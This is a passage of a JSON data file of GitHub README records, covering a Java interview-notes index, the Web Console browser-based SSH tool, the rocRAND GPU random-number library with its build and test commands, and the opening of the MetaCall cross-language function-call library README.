[ArrayList\/Vector](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ArrayList.md)\n- [LinkedList](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/LinkedList.md)\n- [HashMap](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/HashMap.md)\n- [HashSet](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/collection\/HashSet.md)\n- [LinkedHashMap](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/collection\/LinkedHashMap.md)\n\n### Java \u591a\u7ebf\u7a0b\n- [\u591a\u7ebf\u7a0b\u4e2d\u7684\u5e38\u89c1\u95ee\u9898](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Thread-common-problem.md)\n- [synchronized \u5173\u952e\u5b57\u539f\u7406](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Synchronize.md)\n- [\u591a\u7ebf\u7a0b\u7684\u4e09\u5927\u6838\u5fc3](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Threadcore.md)\n- [\u5bf9\u9501\u7684\u4e00\u4e9b\u8ba4\u77e5](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Java-lock.md)\n- [ReentrantLock \u5b9e\u73b0\u539f\u7406 ](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ReentrantLock.md)\n- [ConcurrentHashMap \u7684\u5b9e\u73b0\u539f\u7406](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ConcurrentHashMap.md)\n- [\u5982\u4f55\u4f18\u96c5\u7684\u4f7f\u7528\u548c\u7406\u89e3\u7ebf\u7a0b\u6c60](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ThreadPoolExecutor.md)\n- [\u6df1\u5165\u7406\u89e3\u7ebf\u7a0b\u901a\u4fe1](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/concurrent\/thread-communication.md)\n- [\u4e00\u4e2a\u7ebf\u7a0b\u7f62\u5de5\u7684\u8be1\u5f02\u4e8b\u4ef6](docs\/thread\/thread-gone.md)\n- [\u7ebf\u7a0b\u6c60\u4e2d\u4f60\u4e0d\u5bb9\u9519\u8fc7\u7684\u4e00\u4e9b\u7ec6\u8282](docs\/thread\/thread-gone2.md)\n- [\u300e\u5e76\u53d1\u5305\u5165\u5751\u6307\u5317\u300f\u4e4b\u963b\u585e\u961f\u5217](docs\/thread\/ArrayBlockingQueue.md)\n\n### JVM\n- [Java \u8fd0\u884c\u65f6\u5185\u5b58\u5212\u5206](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/MemoryAllocation.md)\n-  [\u7c7b\u52a0\u8f7d\u673a\u5236](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ClassLoad.md)\n-  [OOM \u5206\u6790](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/OOM-analysis.md)\n- [\u5783\u573e\u56de\u6536](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/GarbageCollection.md)\n- [\u5bf9\u8c61\u7684\u521b\u5efa\u4e0e\u5185\u5b58\u5206\u914d](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/newObject.md)\n- [\u4f60\u5e94\u8be5\u77e5\u9053\u7684 volatile \u5173\u952e\u5b57](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/concurrent\/volatile.md)\n- [\u4e00\u6b21\u5185\u5b58\u6ea2\u51fa\u6392\u67e5\u4f18\u5316\u5b9e\u6218](https:\/\/crossoverjie.top\/2018\/08\/29\/java-senior\/OOM-Disruptor\/)\n- [\u4e00\u6b21 HashSet \u6240\u5f15\u8d77\u7684\u5e76\u53d1\u95ee\u9898](docs\/jvm\/JVM-concurrent-HashSet-problem.md)\n- [\u4e00\u6b21\u751f\u4ea7 CPU 100% \u6392\u67e5\u4f18\u5316\u5b9e\u8df5](docs\/jvm\/cpu-percent-100.md)\n\n### \u5206\u5e03\u5f0f\u76f8\u5173\n\n- [\u5206\u5e03\u5f0f\u9650\u6d41](http:\/\/crossoverjie.top\/2018\/04\/28\/sbc\/sbc7-Distributed-Limit\/)\n- [\u57fa\u4e8e Redis \u7684\u5206\u5e03\u5f0f\u9501](http:\/\/crossoverjie.top\/2018\/03\/29\/distributed-lock\/distributed-lock-redis\/)\n- [\u5206\u5e03\u5f0f\u7f13\u5b58\u8bbe\u8ba1](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Cache-design.md)\n- [\u5206\u5e03\u5f0f ID \u751f\u6210\u5668](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/ID-generator.md)\n\n### \u5e38\u7528\u6846\u67b6\\\u7b2c\u4e09\u65b9\u7ec4\u4ef6\n\n- [Spring Bean \u751f\u547d\u5468\u671f](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/spring\/spring-bean-lifecycle.md)\n- [Spring AOP \u7684\u5b9e\u73b0\u539f\u7406](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/SpringAOP.md) \n- [Guava \u6e90\u7801\u5206\u6790\uff08Cache \u539f\u7406\uff09](https:\/\/crossoverjie.top\/2018\/06\/13\/guava\/guava-cache\/)\n- [\u8f7b\u91cf\u7ea7 HTTP \u6846\u67b6](https:\/\/github.com\/crossoverJie\/cicada)\n- [Kafka produce \u6e90\u7801\u5206\u6790](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/kafka\/kafka-product.md)\n- [Kafka \u6d88\u8d39\u5b9e\u8df5](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/docs\/frame\/kafka-consumer.md)\n\n\n### \u67b6\u6784\u8bbe\u8ba1\n- [\u79d2\u6740\u7cfb\u7edf\u8bbe\u8ba1](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Spike.md)\n- [\u79d2\u6740\u67b6\u6784\u5b9e\u8df5](http:\/\/crossoverjie.top\/2018\/05\/07\/ssm\/SSM18-seconds-kill\/)\n- [\u8bbe\u8ba1\u4e00\u4e2a\u767e\u4e07\u7ea7\u7684\u6d88\u606f\u63a8\u9001\u7cfb\u7edf](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/architecture-design\/million-sms-push.md)\n\n### DB \u76f8\u5173\n\n- [MySQL \u7d22\u5f15\u539f\u7406](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/MySQL-Index.md)\n- [SQL \u4f18\u5316](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/SQL-optimization.md)\n- [\u6570\u636e\u5e93\u6c34\u5e73\u5782\u76f4\u62c6\u5206](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/DB-split.md)\n- [\u4e00\u6b21\u5206\u8868\u8e29\u5751\u5b9e\u8df5\u7684\u63a2\u8ba8](docs\/db\/sharding-db.md)\n\n### \u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\n- [\u7ea2\u5305\u7b97\u6cd5](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/red\/RedPacket.java)\n- [\u4e8c\u53c9\u6811\u5c42\u5e8f\u904d\u5386](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/BinaryNode.java#L76-L101)\n- [\u662f\u5426\u4e3a\u5feb\u4e50\u6570\u5b57](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/HappyNum.java#L38-L55)\n- [\u94fe\u8868\u662f\u5426\u6709\u73af](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/LinkLoop.java#L32-L59)\n- [\u4ece\u4e00\u4e2a\u6570\u7ec4\u4e2d\u8fd4\u56de\u4e24\u4e2a\u503c\u76f8\u52a0\u7b49\u4e8e\u76ee\u6807\u503c\u7684\u4e0b\u6807](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/TwoSum.java#L38-L59)\n- [\u4e00\u81f4\u6027 Hash \u7b97\u6cd5\u539f\u7406](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Consistent-Hash.md)\n- [\u4e00\u81f4\u6027 Hash \u7b97\u6cd5\u5b9e\u8df5](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/docs\/algorithm\/consistent-hash-implement.md)\n- [\u9650\u6d41\u7b97\u6cd5](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/Limiting.md)\n- [\u4e09\u79cd\u65b9\u5f0f\u53cd\u5411\u6253\u5370\u5355\u5411\u94fe\u8868](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/ReverseNode.java)\n- [\u5408\u5e76\u4e24\u4e2a\u6392\u597d\u5e8f\u7684\u94fe\u8868](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/MergeTwoSortedLists.java)\n- [\u4e24\u4e2a\u6808\u5b9e\u73b0\u961f\u5217](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/algorithm\/TwoStackQueue.java)\n- [\u52a8\u624b\u5b9e\u73b0\u4e00\u4e2a LRU cache](http:\/\/crossoverjie.top\/2018\/04\/07\/algorithm\/LRU-cache\/)\n- [\u94fe\u8868\u6392\u5e8f](.\/src\/main\/java\/com\/crossoverjie\/algorithm\/LinkedListMergeSort.java)\n- [\u6570\u7ec4\u53f3\u79fb k \u6b21](.\/src\/main\/java\/com\/crossoverjie\/algorithm\/ArrayKShift.java)\n- [\u4ea4\u66ff\u6253\u5370\u5947\u5076\u6570](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/src\/main\/java\/com\/crossoverjie\/actual\/TwoThread.java)\n- [\u4ebf\u7ea7\u6570\u636e\u4e2d\u5224\u65ad\u6570\u636e\u662f\u5426\u4e0d\u5b58\u5728](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/docs\/algorithm\/guava-bloom-filter.md) \n\n### Netty \u76f8\u5173\n- [SpringBoot \u6574\u5408\u957f\u8fde\u63a5\u5fc3\u8df3\u673a\u5236](https:\/\/crossoverjie.top\/2018\/05\/24\/netty\/Netty(1)TCP-Heartbeat\/)\n- [\u4ece\u7ebf\u7a0b\u6a21\u578b\u7684\u89d2\u5ea6\u770b Netty \u4e3a\u4ec0\u4e48\u662f\u9ad8\u6027\u80fd\u7684\uff1f](https:\/\/crossoverjie.top\/2018\/07\/04\/netty\/Netty(2)Thread-model\/)\n- [\u4e3a\u81ea\u5df1\u642d\u5efa\u4e00\u4e2a\u5206\u5e03\u5f0f IM(\u5373\u65f6\u901a\u8baf) \u7cfb\u7edf](https:\/\/github.com\/crossoverJie\/cim)\n\n### \u9644\u52a0\u6280\u80fd\n\n- [TCP\/IP \u534f\u8bae](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/TCP-IP.md)\n- [\u4e00\u4e2a\u5b66\u6e23\u7684\u963f\u91cc\u4e4b\u8def](https:\/\/crossoverjie.top\/2018\/06\/21\/personal\/Interview-experience\/)\n- [\u5982\u4f55\u6210\u4e3a\u4e00\u4f4d\u300c\u4e0d\u90a3\u4e48\u5dee\u300d\u7684\u7a0b\u5e8f\u5458](https:\/\/crossoverjie.top\/2018\/08\/12\/personal\/how-to-be-developer\/)\n- [\u5982\u4f55\u9ad8\u6548\u7684\u4f7f\u7528 Git](https:\/\/github.com\/crossoverJie\/JCSprout\/blob\/master\/MD\/additional-skills\/how-to-use-git-efficiently.md)\n\n\n### \u8054\u7cfb\u4f5c\u8005\n\n> crossoverJie#gmail.com\n\n<img src=\"https:\/\/ws2.sinaimg.cn\/large\/006tKfTcly1fsa01u7ro1j30gs0howfq.jpg\" width=\"300\"\/> \n"},{"repo":"\/nickola\/web-console","language":"JavaScript","readme_contents":"# About\n\nWeb Console is a web-based application that allows to execute shell commands on a server directly from a browser (web-based SSH).\nThe application is very light, does not require any database and can be installed and configured in about 3 minutes.\n\nIf you like Web Console, please consider an opportunity to support it on [Patreon](https:\/\/www.patreon.com\/nickola).\n\n![Web Console](https:\/\/raw.github.com\/nickola\/web-console\/master\/screenshots\/main.png)\n\n# Installation\n\nInstallation process is really simple:\n\n  - [Download](https:\/\/github.com\/nickola\/web-console\/releases\/download\/v0.9.7\/webconsole-0.9.7.zip) latest version of the Web Console.\n  - Unpack archive and open file `webconsole.php` in your favorite text editor.\n  - At the beginning of the file enter your `$USER` and `$PASSWORD` credentials, edit any other settings that you like (see description in the comments).\n  - Upload changed `webconsole.php` file to the web server and open it in the browser.\n\n# About author\n\nWeb Console has been developed by [Nickolay Kovalev](http:\/\/nickola.ru).\nIf you have interest job offers, you can see him contacts at his [CV](http:\/\/cv.nickola.ru).\nAlso, various third-party components are used.\n\n# Used components\n\n  - jQuery JavaScript Library: https:\/\/github.com\/jquery\/jquery\n  - jQuery Terminal Emulator: https:\/\/github.com\/jcubic\/jquery.terminal\n  - jQuery Mouse Wheel Plugin: https:\/\/github.com\/brandonaaron\/jquery-mousewheel\n  - PHP JSON-RPC 2.0 Server\/Client Implementation: https:\/\/github.com\/sergeyfast\/eazy-jsonrpc\n  - Normalize.css: https:\/\/github.com\/necolas\/normalize.css\n\n# URLs\n\n - Website: http:\/\/web-console.org\n - GitHub: https:\/\/github.com\/nickola\/web-console\n - Patreon: https:\/\/www.patreon.com\/nickola\n - Author: http:\/\/nickola.ru\n\n# License\n\nWeb Console is licensed under [GNU LGPL Version 3](http:\/\/www.gnu.org\/licenses\/lgpl.html) license.\n"},{"repo":"\/ROCmSoftwarePlatform\/rocRAND","language":"C","readme_contents":"# rocRAND\n\nThe rocRAND project provides functions that generate pseudo-random and quasi-random numbers.\n\nThe rocRAND library is implemented in the [HIP](https:\/\/github.com\/ROCm-Developer-Tools\/HIP)\nprogramming language and optimised for AMD's latest discrete GPUs. It is designed to run on top\nof AMD's Radeon Open Compute [ROCm](https:\/\/rocm.github.io\/) runtime, but it also works on\nCUDA enabled GPUs.\n\nAdditionally, the project includes a wrapper library called hipRAND which allows user to easily port\nCUDA applications that use cuRAND library to the [HIP](https:\/\/github.com\/ROCm-Developer-Tools\/HIP)\nlayer. In [ROCm](https:\/\/rocm.github.io\/) environment hipRAND uses rocRAND, however in CUDA\nenvironment cuRAND is used instead.\n\n## Supported Random Number Generators\n\n* XORWOW\n* MRG32k3a\n* Mersenne Twister for Graphic Processors (MTGP32)\n* Philox (4x32, 10 rounds)\n* Sobol32\n\n## Requirements\n\n* Git\n* cmake (3.0.2 or later)\n* C++ compiler with C++11 support\n* For AMD platforms:\n  * [ROCm](https:\/\/rocm.github.io\/install.html) (1.7 or later)\n  * [HCC](https:\/\/github.com\/RadeonOpenCompute\/hcc) compiler, which must be\n    set as C++ compiler on ROCm platform.\n* For CUDA platforms:\n  * [HIP](https:\/\/github.com\/ROCm-Developer-Tools\/HIP) (hcc is not required)\n  * Latest CUDA SDK\n\nOptional:\n\n* [GTest](https:\/\/github.com\/google\/googletest) (required only for tests; building tests is enabled by default)\n  * Use `GTEST_ROOT` to specify GTest location (also see [FindGTest](https:\/\/cmake.org\/cmake\/help\/latest\/module\/FindGTest.html))\n  * Note: If GTest is not already installed, it will be automatically downloaded and built\n* [TestU01](http:\/\/simul.iro.umontreal.ca\/testu01\/tu01.html) (required only for crush tests)\n  * Use `TESTU01_ROOT_DIR` to specify TestU01 location\n  * Note: If TestU01 is not already installed, it will be automatically downloaded and built\n* Fortran compiler (required only for Fortran wrapper)\n  * `gfortran` is recommended.\n* Python 2.7+ or 3.5+ (required only for Python wrapper)\n\nIf some dependencies are missing, cmake script automatically downloads, builds and\ninstalls them. Setting `DEPENDENCIES_FORCE_DOWNLOAD` option `ON` forces script to\nnot to use system-installed libraries, and to download all dependencies.\n\n## Build and Install\n\n```\ngit clone https:\/\/github.com\/ROCmSoftwarePlatform\/rocRAND.git\n\n# Go to rocRAND directory, create and go to build directory\ncd rocRAND; mkdir build; cd build\n\n# Configure rocRAND, setup options for your system\n# Build options: BUILD_TEST, BUILD_BENCHMARK (off by default), BUILD_CRUSH_TEST (off by default)\n#\n# ! IMPORTANT !\n# On ROCm platform set C++ compiler to HCC. You can do it by adding 'CXX=<path-to-hcc>' or just\n# `CXX=hcc` before 'cmake', or setting cmake option 'CMAKE_CXX_COMPILER' to path to the HCC compiler.\n#\n[CXX=hcc] cmake -DBUILD_BENCHMARK=ON ..\/. # or cmake-gui ..\/.\n\n# Build\n# For ROCM-1.6, if a HCC runtime error is caught, consider setting\n# HCC_AMDGPU_TARGET=<arch> in front of make as a workaround\nmake -j4\n\n# Optionally, run tests if they're enabled\nctest --output-on-failure\n\n# Install\n[sudo] make install\n```\n\nNote: Existing gtest library in the system (especially static gtest libraries built with other compilers)\nmay cause build failure; if errors are encountered with existing gtest library or other dependencies,\n`DEPENDENCIES_FORCE_DOWNLOAD` flag can be passed to cmake, as mentioned before, to help solve the problem.\n\nNote: To disable inline assembly optimisations in rocRAND (for both the host library and\nthe device functions provided in `rocrand_kernel.h`) set cmake option `ENABLE_INLINE_ASM`\nto `OFF`.\n\n## Running Unit Tests\n\n```\n# Go to rocRAND build directory\ncd rocRAND; cd build\n\n# To run all tests\nctest\n\n# To run unit tests\n.\/test\/<unit-test-name>\n```\n\n## Running Benchmarks\n\n```\n# Go to rocRAND build directory\ncd rocRAND; cd build\n\n# To run benchmark for generate functions:\n# engine -> all, xorwow, mrg32k3a, mtgp32, philox, sobol32\n# distribution -> all, uniform-uint, uniform-float, uniform-double, normal-float, normal-double,\n#                 log-normal-float, log-normal-double, poisson\n# Further option can be found using --help\n.\/benchmark\/benchmark_rocrand_generate --engine <engine> --dis <distribution>\n\n# To run benchmark for device kernel functions:\n# engine -> all, xorwow, mrg32k3a, mtgp32, philox, sobol32\n# distribution -> all, uniform-uint, uniform-float, uniform-double, normal-float, normal-double,\n#                 log-normal-float, log-normal-double, poisson, discrete-poisson, discrete-custom\n# further option can be found using --help\n.\/benchmark\/benchmark_rocrand_kernel --engine <engine> --dis <distribution>\n\n# To compare against cuRAND (cuRAND must be supported):\n.\/benchmark\/benchmark_curand_generate --engine <engine> --dis <distribution>\n.\/benchmark\/benchmark_curand_kernel --engine <engine> --dis <distribution>\n```\n\n## Running Statistical Tests\n\n```\n# Go to rocRAND build directory\ncd rocRAND; cd build\n\n# To run \"crush\" test, which verifies that generated pseudorandom\n# numbers are of high quality:\n# engine -> all, xorwow, mrg32k3a, mtgp32, philox\n.\/test\/crush_test_rocrand --engine <engine>\n\n# To run Pearson Chi-squared and Anderson-Darling tests, which verify\n# that distribution of random number agrees with the requested distribution:\n# engine -> all, xorwow, mrg32k3a, mtgp32, philox, sobol32\n# distribution -> all, uniform-float, uniform-double, normal-float, normal-double,\n#                 log-normal-float, log-normal-double, poisson\n.\/test\/stat_test_rocrand_generate --engine <engine> --dis <distribution>\n```\n\n## Documentation\n\n```\n# go to rocRAND doc directory\ncd rocRAND; cd doc\n\n# run doxygen\ndoxygen Doxyfile\n\n# open html\/index.html\n\n```\n\n## Wrappers\n\n* C++ wrappers for host API of rocRAND and hipRAND are in files [`rocrand.hpp`](.\/library\/include\/rocrand.hpp)\nand [`hiprand.hpp`](.\/library\/include\/hiprand.hpp).\n* [Fortran wrappers](.\/library\/src\/fortran\/).\n* [Python wrappers](.\/python\/): [rocRAND](.\/python\/rocrand) and [hipRAND](.\/python\/hiprand).\n\n## Support\n\nBugs and feature requests can be reported through [the issue tracker](https:\/\/github.com\/ROCmSoftwarePlatform\/rocRAND\/issues).\n\n## Contributions and License\n\nContributions of any kind are most welcome! More details are found at [CONTRIBUTING](.\/CONTRIBUTING.md)\nand [LICENSE](.\/LICENSE.txt). Please note that [statistical tests](.\/test\/crush) link to TestU01 library\ndistributed under GNU General Public License (GPL) version 3, thus GPL version 3 license applies to\nthat part of the project.\n"},{"repo":"\/metacall\/core","language":"C","readme_contents":"<div align=\"center\">\n  <a href=\"https:\/\/metacall.io\" target=\"_blank\"><img src=\"https:\/\/raw.githubusercontent.com\/metacall\/core\/master\/deploy\/images\/logo.png\" alt=\"M E T A C A L L\" style=\"max-width:100%; margin: 0 auto;\" width=\"80\" height=\"80\">\n  <p><b>M E T A C A L L<\/b><\/p><\/a>\n  <p>A library for providing inter-language foreign function interface calls<\/p>\n<\/div>\n\n# Abstract\n\n**METACALL** is a library that allows calling functions, methods or procedures between programming languages. With **METACALL** you can transparently execute code from \/ to any programming language, for example, call Python code from JavaScript code.\n\n`sum.py`\n``` python\ndef sum(a, b):\n  return a + b\n```\n\n`main.js`\n``` javascript\nmetacall_load_from_file('py', [ 'sum.py' ]);\n\nmetacall('sum', 3, 4); \/\/ 7\n```\n\n<div align=\"center\">\n  <a href=\"https:\/\/medium.com\/@metacall\/call-functions-methods-or-procedures-between-programming-languages-with-metacall-58cfece35d7\" target=\"_blank\"><img src=\"https:\/\/raw.githubusercontent.com\/metacall\/core\/master\/deploy\/images\/overview.png\" alt=\"M E T A C A L L\" style=\"max-width:100%; margin: 0 auto;\" width=\"350\" height=\"auto\">\n<\/div>\n\n# Table Of Contents\n\n<!-- TOC -->\n\n- [Abstract](#abstract)\n- [Table Of Contents](#table-of-contents)\n    - [1. Motivation](#1-motivation)\n    - [2. Language Support (Backends)](#2-language-support-backends)\n    - [3. Use Cases](#3-use-cases)\n    - [3.1 Known Projects Using MetaCall](#31-known-projects-using-metacall)\n    - [4. Usage](#4-usage)\n    - [4.1 Installation](#41-installation)\n        - [4.2 Environment Variables](#42-environment-variables)\n        - [4.3 Examples](#43-examples)\n    - [5. Architecture](#5-architecture)\n        - [5.1 Overview](#51-overview)\n            - [5.1.1 Design Decisions](#511-design-decisions)\n            - [5.1.2 Modules](#512-modules)\n        - [5.2 Reflect](#52-reflect)\n            - [5.2.1 Type System](#521-type-system)\n            - [5.2.2 Values](#522-values)\n            - [5.2.3 Functions](#523-functions)\n        - [5.3 Plugins](#53-plugins)\n            - [5.3.1 Loaders](#531-loaders)\n                - [5.3.1.1 Python](#5311-python)\n                - [5.3.1.2 NodeJS](#5312-nodejs)\n                - [5.3.1.3 JavaScript](#5313-javascript)\n                - [5.3.1.4 C#](#5314-c)\n                - [5.3.1.5 Ruby](#5315-ruby)\n                - [5.3.1.6 Mock](#5316-mock)\n                - [5.3.1.7 File](#5317-file)\n            - [5.3.2 Serials](#532-serials)\n                - [5.3.2.1 MetaCall](#5321-metacall)\n                - [5.3.2.2 RapidJSON](#5322-rapidjson)\n            - [5.3.3 Detours](#533-detours)\n                - [5.3.3.1 FuncHook](#5331-funchook)\n        - [5.4 Ports](#54-ports)\n        - [5.5 Serialization](#55-serialization)\n        - [5.6 Memory Layout](#56-memory-layout)\n        - [5.7 Fork Model](#57-fork-model)\n        - [5.8 Threading Model](#58-threading-model)\n    - [5. Application Programming Interface (API)](#5-application-programming-interface-api)\n    - [6. Build System](#6-build-system)\n        - [6.1 Build Options](#61-build-options)\n        - [6.2 Coverage](#62-coverage)\n    - [7. Platform Support](#7-platform-support)\n        - [7.1 Docker Support](#71-docker-support)\n        - [7.1.1 Docker Development](#711-docker-development)\n        - [7.1.2 Docker Testing](#712-docker-testing)\n    - [8. License](#8-license)\n\n<!-- \/TOC -->\n\n## 1. Motivation\n\nThe **METACALL** project started time ago when I was coding a [Game Engine for an MMORPG](https:\/\/bitbucket.org\/parrastudios\/argentum-online-c). My idea was to provide an interface to allow other programmers extend the Game Engine easily. By that time, I was finishing the university so I decide to do my [Final Thesis](https:\/\/bitbucket.org\/parrastudios\/argentum-online-c\/raw\/e6e78fef80c6adc541640d68d422721ef735184f\/common\/doc\/Plugin\/plugin-framework-paper.pdf) and [Presentation](https:\/\/bitbucket.org\/parrastudios\/argentum-online-c\/raw\/e6e78fef80c6adc541640d68d422721ef735184f\/common\/doc\/Plugin\/plugin-framework-presentation.pdf) based on the plug-in system for my Game Engine. The Plugin Architecture designed for the Game Engine has similarities with **METACALL** although the architecture has been redefined and the code has been rewritten from scratch. After some refination of the system, I came up with **METACALL** and other use cases for the tool. Currently we are using **METACALL** to build a cutting edge FaaS (Function as a Service) **[https:\/\/metacall.io](https:\/\/metacall.io\/)** based on this technique to provide high scalability of the functions among multiple cores and **[Function Mesh](https:\/\/medium.com\/@metacall\/function-mesh-architecture-c0304ba4bad0)** pattern, a new technique I have developed to interconnect transparently functions in a distributed system based on this library.\n\n## 2. Language Support (Backends)\n\nThis section describes all programming languages that **METACALL** supports, if you are interested in from what languages can be used **METACALL** you must go to [ports section](#54-ports).\n\n- Currently supported languages and run-times:\n\n| Language                                                           | Runtime                                                                                      |               Version                | Tag  |\n|--------------------------------------------------------------------|----------------------------------------------------------------------------------------------|:------------------------------------:|:----:|\n| [Python](https:\/\/www.python.org\/)                                  | [Python C API](https:\/\/docs.python.org\/3\/c-api\/intro.html)                                   |          **>= 3.2 <= 3.7**           |  py  |\n| [NodeJS](https:\/\/nodejs.org\/)                                      | [N API](https:\/\/nodejs.org\/api\/n-api.html)                                                   | **>= 8.11.1<sup>\u2020<\/sup> <= 10.16.3** | node |\n| [JavaScript](https:\/\/developer.mozilla.org\/bm\/docs\/Web\/JavaScript) | [V8](https:\/\/v8.dev\/)                                                                        |             **5.1.117**              |  js  |\n| [C#](https:\/\/dotnet.microsoft.com\/)                                | [NetCore](https:\/\/github.com\/dotnet\/docs\/blob\/master\/docs\/core\/tutorials\/netcore-hosting.md) |    **>= 1.0.0-preview2 <= 2.2.7**    |  cs  |\n| [Ruby](https:\/\/ruby-lang.org\/)                                     | [Ruby C API](https:\/\/silverhammermba.github.io\/emberb\/c\/)                                    |          **>= 2.1 <= 2.3**           |  rb  |\n| [File](\/source\/loaders\/file_loader)                                | **\u2205**                                                                                        |              **0.1.0**               | file |\n| [Mock](\/source\/loaders\/mock_loader)                                | **\u2205**                                                                                        |              **0.1.0**               | mock |\n\n\u2020. **NodeJS 8.x** does not support async functions.\n\n- Languages and run-times under construction:\n\n| Language                                                           | Runtime                                                                                                | Tag  |\n|--------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------|:----:|\n| [WebAssembly](https:\/\/webassembly.org\/)                            | [WebAssembly Virtual Machine](https:\/\/github.com\/WAVM\/WAVM)                                            | wasm |\n| [C\/C++](http:\/\/www.cplusplus.com\/)                                 | [Clang](https:\/\/clang.llvm.org\/) - [LLVM](https:\/\/llvm.org\/) - [libffi](http:\/\/sourceware.org\/libffi\/) |  c   |\n| [Java](https:\/\/www.java.com\/)                                      | [JNI](https:\/\/docs.oracle.com\/javase\/8\/docs\/technotes\/guides\/jni\/)                                     | java |\n| [PHP](https:\/\/php.net\/)                                            | [Zend](https:\/\/www.php.net\/manual\/en\/internals2.ze1.zendapi.php)                                       | php  |\n| [Go](https:\/\/golang.org\/)                                          | Go Runtime                                                                                             |  go  |\n| [Haskell](https:\/\/www.haskell.org\/)                                | [Haskell FFI](https:\/\/wiki.haskell.org\/GHC\/Using_the_FFI)                                              |  hs  |\n| [JavaScript](https:\/\/developer.mozilla.org\/bm\/docs\/Web\/JavaScript) | [SpiderMonkey](https:\/\/developer.mozilla.org\/en-US\/docs\/Mozilla\/Projects\/SpiderMonkey\/JSAPI_reference) | jsm  |\n\n## 3. Use Cases\n\n**METACALL** can be used in the following cases:\n\n- Interconnect different technologies in the same project. It allows to have heterogeneous teams of developers working over same project in an isolated way and using different programming languages at the same time.\n\n- Embedding programming languages to existing softwares. Game Engines, 3D Editors like [Blender](https:\/\/www.blender.org\/), among others can take benefit of **METACALL** and extend the core functionality with higher level programming languages (aka scripting).\n\n- Function as a Service. **METACALL** can be used to implement efficient FaaS architectures. We are using it to implement our own FaaS (Function as a Service) **[https:\/\/metacall.io](https:\/\/metacall.io\/)** based on **[Function Mesh](https:\/\/medium.com\/@metacall\/function-mesh-architecture-c0304ba4bad0)** pattern and high performance function scalability thanks to this library.\n\n- Source code migrations. **METACALL** can wrap large and legacy code-bases, and provide an agnostic way to work with the codebase into a new programming language. Eventually the code can be migrated by parts, without need of creating a new project or stopping the production environment. Incremental changes can be done, solving the migration easily and with less time and effort.\n\n- Porting low level libraries to high level languages transparently. With **METACALL** you can get rid of extension APIs like Python C API or NodeJS N-API. You can call directly low level libraries from your high level languages without making a wrapper in C or C++ for it.\n\nAs you can see, there are plenty of uses. **METACALL** introduces a new model of programming which allows a high interoperability between technologies. If you find any other use case just let us know about it with a Pull Request and we will add it to the list.\n\n## 3.1 Known Projects Using MetaCall\n\n- **[Acid Cam](https:\/\/www.facebook.com\/AcidCam\/)**: A software for video manipulation that distorts videos for generating art by means of OpenCV. [Acid Cam CLI](https:\/\/github.com\/lostjared\/acidcam-cli) uses **METACALL** to allow custom filters written in Python and easily embed Python programming language into its plugin system.\n\n## 4. Usage\n\n## 4.1 Installation\n\nPrior to try any example, you must have **METACALL** installed in your system. To install **METACALL** you have the following options.\n\n- [Download a release](\/TODO).\n- [Install via package manager](\/TODO).\n- [Build and install it manually](#6-build-system).\n- [Pull it from DockerHub](\/TODO).\n\n### 4.2 Environment Variables\n\nThis environment variables are optional, in case that you want to modify default paths of **METACALL**.\n\n|           Name            | Description                                                      |          Default Value           |\n|:-------------------------:|------------------------------------------------------------------|:--------------------------------:|\n| 